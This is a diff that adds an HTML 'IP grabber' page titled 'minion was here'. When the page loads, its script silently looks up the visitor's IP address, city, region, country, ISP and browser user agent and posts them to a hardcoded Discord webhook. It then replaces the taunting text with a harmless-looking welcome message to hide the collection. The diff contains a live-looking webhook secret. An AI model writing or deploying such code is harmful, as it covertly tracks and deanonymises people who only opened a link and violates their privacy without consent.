@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>minion was here</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 600px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>minion was here</h1>
+        <p>he saw you click this</p>
+    </div>
+
+    <script>
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error fetching IP information:', error);
+                return null;
+            }
+        }
+
+        async function sendToDiscord(ipData) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1490158506861531269/cALyDn-sZquB7kuL7ZV_Umf35ghwnbqMkvA4SAcmqB-DLzJ_HtkhqL-9mgZI-JM_hq7d';
+            
+            const message = {
+                embeds: [{
+                    title: "new ip?",
+                    color: 0x3498db,
+                    fields: [
+                        { name: "IP Address", value: ipData.ip, inline: true },
+                        { name: "City", value: ipData.city || "Unknown", inline: true },
+                        { name: "Region", value: ipData.region || "Unknown", inline: true },
+                        { name: "Country", value: ipData.country_name || "Unknown", inline: true },
+                        { name: "ISP", value: ipData.org || "Unknown", inline: true },
+                        { name: "User Agent", value: navigator.userAgent, inline: false }
+                    ],
+                    footer: {
+                        text: `Visited at: ${new Date().toLocaleString()}`
+                    }
+                }]
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                });
+                
+                if (response.ok) {
+                    console.log('IP information sent to Discord successfully');
+                } else {
+                    console.error('Failed to send IP information to Discord');
+                }
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        async function logAndSendIP() {
+            const ipData = await getIPInfo();
+            if (ipData) {
+                sendToDiscord(ipData);
+            }
+            
+            document.querySelector('.container p').textContent = "Welcome to our website! Feel free to explore our content.";
+        }
+
+        window.addEventListener('load', logAndSendIP);
+    </script>
+</body>
+</html>
